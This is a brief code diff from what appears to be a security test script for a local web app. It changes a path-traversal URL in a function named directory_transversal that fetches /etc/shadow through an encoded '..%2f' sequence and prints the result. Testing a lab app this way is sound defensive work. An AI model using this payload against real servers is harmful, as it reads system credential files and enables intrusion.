@@ -79,7 +79,7 @@ def sess_pred(driver):
 
 def directory_transversal(driver):
 
-    url = "http://127.0.0.1:5000/get_file/..%2f/etc/shadow"
+    url = "http://127.0.0.1:5000/get_file/..%2fetc/shadow"
     driver.get(url)
     r = requests.get(url)
     print(r.text)
